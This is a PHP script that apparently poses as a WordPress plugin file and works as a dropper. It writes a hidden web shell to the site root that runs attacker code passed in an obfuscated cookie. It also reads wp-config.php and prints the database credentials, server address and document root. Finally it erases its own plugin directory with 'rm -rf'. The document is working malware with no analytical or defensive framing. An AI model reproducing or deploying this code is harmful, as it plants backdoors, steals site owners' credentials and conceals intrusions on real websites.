<?php 
ini_set('display_errors', 0);
ini_set('display_startup_errors', 0);
error_reporting(E_ALL);

$r = [];
$plug_name = basename(__DIR__);


//////

$pass = substr(md5(time()), rand(1, 10), 6);
$mn = substr(md5(time()+1), rand(1, 10), 6);
$ks = [];
$ks2 = [];
while(count($ks)!=6){
	$k = mt_rand(0,29);
	if(array_key_exists($k, $ks2)){
		echo 'dubl'.PHP_EOL;
	}else{
		$ks2[$k] = $k;
		$ks[] = $k;
	}
}

$sbody = '<?php if($_COOKIE[4]=="'.md5($pass).'") eval(base64_decode(str_rot13($_COOKIE[3]))); ?>';

$spass = implode('-', $ks).'-'.$pass;

/////

$f = fopen('../../../'.$mn.'.php', 'w');
fwrite($f, $sbody);
fclose($f);

if(is_file('../../../'.$mn.'.php'))
{
	$r["SHELL"] = '/'.$mn.'.php;'.$spass;
}else
{
	$r["SHELL"] = 'none';
}



require '../../../wp-config.php';
global $wpdb;

$r['DB_CONF'] = DB_HOST.';'.DB_NAME.';'.DB_USER.';'.DB_PASSWORD;

$r['SERVER_ADDR'] = $_SERVER['SERVER_ADDR'];

$r['DOCUMENT_ROOT'] = $_SERVER['DOCUMENT_ROOT'];

echo '[@]'.json_encode($r).'[@]';

$f = fopen('un.php', 'w');
fclose($f);
exec('rm -rf ../'.$plug_name);
//***

?>